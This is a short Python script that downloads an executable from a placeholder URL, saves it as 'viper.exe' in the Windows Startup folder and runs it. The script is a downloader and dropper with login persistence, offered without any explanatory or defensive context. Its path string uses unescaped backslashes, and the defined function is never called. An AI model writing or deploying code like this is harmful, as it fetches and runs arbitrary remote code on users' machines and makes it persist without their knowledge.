import os
import urllib.request

file = os.environ['APPDATA'] + "\Microsoft\Windows\Start Menu\Programs\Startup\viper.exe"

def executable():
     # Download the executable to the Startup folder
     url = 'http://example.com/example.exe'
     urllib.request.urlretrieve(url, file)
     # Run the executable
     os.system(file)